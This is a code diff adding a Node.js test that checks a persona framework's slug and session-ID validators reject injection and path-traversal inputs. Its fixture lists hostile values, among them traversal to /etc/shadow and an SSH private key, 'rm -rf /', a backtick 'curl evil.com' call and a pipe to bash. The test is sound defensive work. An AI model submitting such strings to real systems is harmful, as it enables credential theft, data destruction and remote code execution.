@@ -63,6 +63,8 @@ test('Persona Architecture: all 7 domain personas have valid declarative manifes
   }
 });
 
+import { validateSlug, validateSessionId } from '../config/persona.mjs';
+
 test('Persona Workflows: security-auditor has 100% declarative step-based workflow pipeline', () => {
   const manifestPath = path.join(PERSONAS_DIR, 'security-auditor', 'persona.yaml');
   const content = fs.readFileSync(manifestPath, 'utf8');
@@ -73,4 +75,37 @@ test('Persona Workflows: security-auditor has 100% declarative step-based workfl
   assert.ok(content.includes('action: "run_llm_query"'), 'Step 2 must be run_llm_query');
   assert.ok(content.includes('action: "apply_fix_or_patch"'), 'Step 3 must be apply_fix_or_patch');
   assert.ok(content.includes('action: "write_report"'), 'Step 4 must be write_report');
+});
+
+test('Transactional Firewall: blocks prompt injection path traversal and unauthorized system targets', () => {
+  const maliciousSlugs = [
+    '../../etc/shadow',
+    'audit; rm -rf /',
+    'persona`curl evil.com`',
+    'persona|bash',
+    '../config/personas',
+    '../../../../root/.ssh/id_rsa'
+  ];
+
+  for (const malicious of maliciousSlugs) {
+    assert.throws(
+      () => validateSlug(malicious, 'persona name'),
+      /Invalid persona name/,
+      `Transactional firewall must reject malicious slug: ${malicious}`
+    );
+  }
+
+  const maliciousSessions = [
+    '../../etc/shadow',
+    '../../../etc/passwd',
+    'session..traversal'
+  ];
+
+  for (const session of maliciousSessions) {
+    assert.throws(
+      () => validateSessionId(session),
+      /directory traversal/,
+      `Transactional firewall must reject session traversal: ${session}`
+    );
+  }
 });
